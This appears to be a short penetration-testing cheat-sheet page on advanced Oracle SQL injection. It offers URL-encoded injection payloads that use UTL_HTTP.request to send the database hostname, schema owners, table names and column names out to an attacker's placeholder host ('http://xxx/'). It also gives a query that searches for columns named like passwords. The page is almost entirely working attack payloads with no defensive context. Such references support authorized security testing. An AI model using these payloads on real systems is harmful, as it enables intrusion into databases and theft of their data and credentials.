---
description: Oracle SQL Injection Advanced Exploitation
---

# Oracle

#### Oracle SQLi OOB - Extract data via HTTP

{% code overflow="wrap" %}
```bash
#Hostname:
asd'+||+UTL_HTTP.request('http://xxx/?host='||(SELECT+host_name+FROM+v$instance))--+-

#Databases (increment the offset):
'+||+UTL_HTTP.request('http://xxx/?dbs='||(SELECT+DISTINCT+owner+FROM+all_tables+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY))--+-

#Tables
'+||+UTL_HTTP.request('http://xxxx/?tables='||(SELECT+table_name+FROM+all_tables+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY))--+-

#Columns
'+||+UTL_HTTP.request('http://xxx/?columns='||(SELECT+column_name+FROM+all_tab_columns+WHERE+table_name+=+'TABLE_NAME'+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY))--+-
```
{% endcode %}

#### Find tables by column name&#x20;

{% code overflow="wrap" %}
```plsql
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%' AND owner != 'SYS';
```
{% endcode %}